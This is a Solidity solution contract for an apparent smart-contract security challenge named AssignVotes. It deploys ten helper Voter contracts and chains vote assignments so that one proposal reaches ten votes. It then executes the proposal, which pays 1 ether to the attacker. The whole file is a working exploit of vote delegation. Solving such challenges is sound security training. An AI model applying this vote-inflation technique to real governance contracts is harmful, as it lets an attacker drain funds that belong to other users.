pragma solidity 0.8.15;

import "../AssignVotes.sol";

contract SolveAssignVotes {
    
    constructor(AssignVotes instance, bytes memory data) {
        solve(instance, data);
    }

    /// @dev just pass 0x for `data`
    /// @dev msg.sender is the attacker
    /// @param instance the address of AssignVotes
    /// @param data data to be used for a proposal
    function solve(AssignVotes instance, bytes memory data) internal {
        // create a proposal
        instance.createProposal(msg.sender, data, 1 ether);
        uint256 proposalId = instance.proposalCounter() - 1;

        // deploy 10 Voter contracts
        Voter[] memory voters = new Voter[](10);
        for (uint256 i = 0; i < 10; ++i) voters[i] = new Voter(instance, proposalId);

        // do the assignments and votes
        for (uint256 i = 0; i < 10; ++i) {
            Voter currentVoter = voters[i];
            // this contract will assign voters 0-5 (inclusive)
            if (i < 6) instance.assign(address(currentVoter));
            // from VC5 onwards, each VC will also approve the next VC
            if (i > 4 && i < 9) currentVoter.assign(voters[i + 1]);
            voters[i].vote();
        }

        (, , , uint votes) = instance.proposals(proposalId);

        // make sure the proposal has 10 votes
        assert(votes == 10);

        // execute the proposal
        instance.execute(proposalId);
    }
}

contract Voter {
    AssignVotes immutable instance;
    uint256 immutable proposalId;

    constructor(AssignVotes _instance, uint256 _proposalId) {
        instance = _instance;
        proposalId = _proposalId;
    }

    function vote() external {
        instance.vote(proposalId);
    }

    function assign(Voter voter) external {
        instance.assign(address(voter));
    }
}
